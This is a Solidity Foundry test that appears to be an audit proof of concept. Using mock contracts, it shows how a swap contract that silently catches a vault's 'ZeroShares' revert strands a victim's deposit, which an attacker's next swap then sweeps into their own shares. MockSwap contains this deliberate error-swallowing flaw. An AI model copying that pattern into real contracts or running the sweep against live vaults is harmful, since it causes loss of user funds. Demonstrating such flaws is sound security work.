// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

/**
 * @title VaultSilentFailure Test
 * @notice Demonstrates silent failure in vault deposits leading to fund loss
 * @dev This is a simplified, desensitized version of a real vulnerability
 */
contract VaultSilentFailureTest is Test {
    MockSwap swap;
    MockVault vault;
    MockERC20 assetToken;
    MockERC20 shareToken;
    
    address victim = address(0x1);
    address attacker = address(0x2);
    
    function setUp() public {
        assetToken = new MockERC20("Asset", "ASSET", 18);
        shareToken = new MockERC20("Vault Share", "vASSET", 18);
        
        vault = new MockVault(address(assetToken), address(shareToken));
        swap = new MockSwap(address(vault), address(assetToken));
        
        // Mint initial assets
        assetToken.mint(victim, 500e18);
        assetToken.mint(attacker, 2000e18);
    }
    
    function testSilentDepositFailureFundsLoss() public {
        // 1. Setup: Vault is in a state where small deposits fail (e.g. inflation attack)
        // High share price: 1 share = 1000 assets
        vault.setSharePrice(1000e18);
        
        console.log("=== Initial State ===");
        console.log("Vault Share Price: 1000 ASSET");
        console.log("Victim Balance: 500 ASSET");
        console.log("Attacker Balance: 2000 ASSET");
        
        // 2. Victim attempts to swap 500 assets
        // This invokes deposit(500) which fails because 500 < 1000 (0 shares)
        vm.startPrank(victim);
        assetToken.approve(address(swap), 500e18);
        
        // This adds 500 ASSET to Swap contract, but deposit fails silently
        swap.swap(500e18);
        vm.stopPrank();
        
        console.log("\n=== After Victim Swap ===");
        console.log("Swap Contract ASSET Balance (Stuck):", assetToken.balanceOf(address(swap)) / 1e18);
        console.log("Victim Share Balance:", shareToken.balanceOf(victim));
        
        // Verification: Funds are stuck in swap contract, victim got nothing
        assertEq(assetToken.balanceOf(address(swap)), 500e18, "Victim funds should be stuck in swap");
        assertEq(shareToken.balanceOf(victim), 0, "Victim should have 0 shares");
        
        // 3. Attacker sweeps the stuck funds
        // Attacker deposits 2000 ASSET
        // Total inside Swap becomes 2500 (2000 + 500 stuck)
        // Deposit(2500) succeeds! (2500 > 1000)
        
        vm.startPrank(attacker);
        assetToken.approve(address(swap), 2000e18);
        
        uint256 attackerSharesBefore = shareToken.balanceOf(attacker);
        swap.swap(2000e18);
        uint256 attackerSharesAfter = shareToken.balanceOf(attacker);
        
        vm.stopPrank();
        
        console.log("\n=== After Attacker Swap ===");
        console.log("Swap Contract ASSET Balance:", assetToken.balanceOf(address(swap)));
        console.log("Attacker Shares Gained:", (attackerSharesAfter - attackerSharesBefore) / 1e18);
        
        // Verification: Attacker got credit for the stuck funds too
        // 2500 assets / 1000 price = 2.5 shares
        // Attacker contributed 2000, but got 2.5 shares worth 2500
        
        uint256 expectedShares = 2500e18 * 1e18 / 1000e18; // 2.5 shares
        // Depending on rounding/implementation, might be 2 shares
        // Let's check simply that they got value > their input
        
        // In this MockVault, shares = assets * 1e18 / price
        assertEq(attackerSharesAfter, 2500e15); // 2.5 * 1e15 (if price 1000e18) -> Mock logic dependent
        
        console.log("VULNERABILITY: Attacker stole victim's stuck funds!");
    }
}

/**
 * @title MockVault
 * @notice Simplified vault that can simulate zero share issuance
 */
contract MockVault {
    IERC20 public asset;
    IERC20 public share;
    uint256 public sharePrice = 1e18; // 1:1 initially
    
    constructor(address _asset, address _share) {
        asset = IERC20(_asset);
        share = IERC20(_share);
    }
    
    function setSharePrice(uint256 _price) external {
        sharePrice = _price;
    }
    
    function deposit(uint256 amount, address receiver) external returns (uint256) {
        if (amount == 0) return 0;
        
        // Calculate shares: amount / price
        // If price is very high (inflation), shares can be 0
        uint256 shares = (amount * 1e18) / sharePrice;
        
        // VULNERABLE BEHAVIOR: 
        // Real ERC4626 might revert on 0 shares, OR return 0
        // If it returns 0, the caller must handle it.
        // Some vaults revert (ZeroShares).
        if (shares == 0) {
            // Simulate reverting with a specific error that Swap catches
            revert("ZeroShares");
        }
        
        asset.transferFrom(msg.sender, address(this), amount);
        MockERC20(address(share)).mint(receiver, shares);
        return shares;
    }
}

/**
 * @title MockSwap
 * @notice Vulnerable swap contract that silently handles deposit failures
 */
contract MockSwap {
    MockVault public vault;
    IERC20 public asset;
    
    constructor(address _vault, address _asset) {
        vault = MockVault(_vault);
        asset = IERC20(_asset);
    }
    
    function swap(uint256 amount) external {
        // 1. Transfer assets from user to this contract
        asset.transferFrom(msg.sender, address(this), amount);
        
        // 2. Setup for deposit
        uint256 balance = asset.balanceOf(address(this));
        asset.approve(address(vault), balance);
        
        // 3. Attempt deposit
        try vault.deposit(balance, msg.sender) {
            // Success
        } catch Error(string memory reason) {
            // VULNERABILITY: Silently catch "ZeroShares" and continue
            // This means assets stay in this contract, but user gets nothing
            if (keccak256(bytes(reason)) == keccak256(bytes("ZeroShares"))) {
                // Ignore error, reset amount to 0 (effectively)
                // Do not revert!
            } else {
                revert(reason);
            }
        }
        
        // 4. Continue with swap logic (omitted)
        // Victim thinks swap finished (or failed gracefully), but funds are taken
    }
}

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public decimals;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    constructor(string memory _name, string memory _symbol, uint8 _decimals) {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    }
    
    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        return _transfer(msg.sender, to, amount);
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) {
            require(allowance[from][msg.sender] >= amount, "Insufficient allowance");
            allowance[from][msg.sender] -= amount;
        }
        return _transfer(from, to, amount);
    }
    
    function _transfer(address from, address to, uint256 amount) internal returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}
